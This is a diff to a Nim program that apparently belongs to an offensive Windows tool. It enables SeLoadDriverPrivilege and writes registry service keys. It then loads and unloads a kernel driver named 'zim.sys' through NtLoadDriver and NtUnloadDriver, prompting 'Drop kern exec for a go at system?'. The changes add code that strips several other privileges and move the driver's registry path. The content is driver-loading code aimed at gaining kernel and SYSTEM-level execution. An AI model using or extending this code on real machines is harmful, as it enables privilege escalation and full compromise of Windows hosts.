@@ -60,7 +60,7 @@ proc NtLoadDriver (driverServiceName: PUNICODE_STRING): NTSTATUS {.stdcall, dynl
 proc NtUnloadDriver (driverServiceName: PUNICODE_STRING): NTSTATUS {.stdcall, dynlib:"ntdll", importc: "NtUnloadDriver".}
 proc ConvertSidToStringSidW(sid: PSID, stringSid: ptr LPWSTR): BOOL {.stdcall, dynlib:"advapi32", importc: "ConvertSidToStringSidW".}
 
-proc enablePriv(priv:string): bool = 
+proc enablePriv(priv:string, enable: bool): bool = 
     var
         hToken: HANDLE
         newtp: TOKEN_PRIVILEGES = TOKEN_PRIVILEGES()
@@ -94,7 +94,10 @@ proc enablePriv(priv:string): bool =
 
     newtp.PrivilegeCount = 1
     newtp.Privileges[0].Luid = luid
-    newtp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED # enable the priv
+    if enable == true:
+        newtp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED # enable the priv
+    else:
+        newtp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED # disable the priv
 
 
     var sOldtp: DWORD = (DWORD)sizeof(TOKEN_PRIVILEGES)
@@ -235,11 +238,13 @@ proc loadDriverNT(driverPath: wstring): bool =
 
     var
         errorCode: ULONG
-        subKey = &"{getCurrentUserSid()}\\System\\CurrentControlSet\\Services\\{SVC_NAME}" # I tried with and without \Services, no go for either; both give me internal error ntstatus
+        #subKey = &"{getCurrentUserSid()}\\System\\CurrentControlSet\\Services\\{SVC_NAME}"
+        # change control to services to rollback the changes to 'working' state
+        subKey = &"System\\CurrentControlSet\\Control\\{SVC_NAME}" # I tried with and without \Services, no go for either; both give me internal error ntstatus
         #subKey = &"System\\CurrentControlSet\\Services\\{SVC_NAME}"
         #pathSourceReg = &"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\{SVC_NAME}"
-        pathSourceReg = &"\\Registry\\User\\{getCurrentUserSid()}\\System\\CurrentControlSet\\Services\\{SVC_NAME}"
-        hkey = HKEY_USERS
+        pathSourceReg = &"\\Registry\\Machine\\System\\CurrentControlSet\\Control\\{SVC_NAME}"
+        hkey = HKEY_LOCAL_MACHINE
         hkResult: HKEY
         disposition: DWORD = 0
         svcType: DWORD = SERVICE_KERNEL_DRIVER
@@ -411,8 +416,25 @@ when isMainModule:
     var zName = "zim.sys"
     
     # enable SeLoadDriverPrivilege
-    if not enablePriv(SE_LOAD_DRIVER_NAME):
-        quit(0)
+    if not enablePriv(SE_LOAD_DRIVER_NAME, true):
+        discard
+        #quit(0)
+
+    
+    # disable SeDebugPrivilege
+    if not enablePriv(SE_DEBUG_NAME, false):
+        discard
+        #quit(0)
+
+    # disable SeImpersonatePrivilege
+    if not enablePriv(SE_IMPERSONATE_NAME, false):
+        discard
+        #quit(0)
+
+    # disable SeCreateGlobalPrivilege
+    if not enablePriv(SE_CREATE_GLOBAL_NAME, false):
+        discard
+        #quit(0)
 
     echo "[?] Drop kern exec for a go at system? [y/n]"
     var k = readLine(stdin)[0]
@@ -501,7 +523,7 @@ when isMainModule:
         if(nt.toLowerAscii() == 'y'):
             var
                 usRegPath: UNICODE_STRING
-                pathSourceReg = &"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\{SVC_NAME}"
+                pathSourceReg = &"\\Registry\\Machine\\System\\CurrentControlSet\\Control\\{SVC_NAME}"
             RtlInitUnicodeString(addr usRegPath, cast[PCWSTR](addr(newWideCString(pathSourceReg)[0])))
             var ntStatus = NtUnloadDriver(addr usRegPath)
             if not NT_SUCCESS(ntStatus):
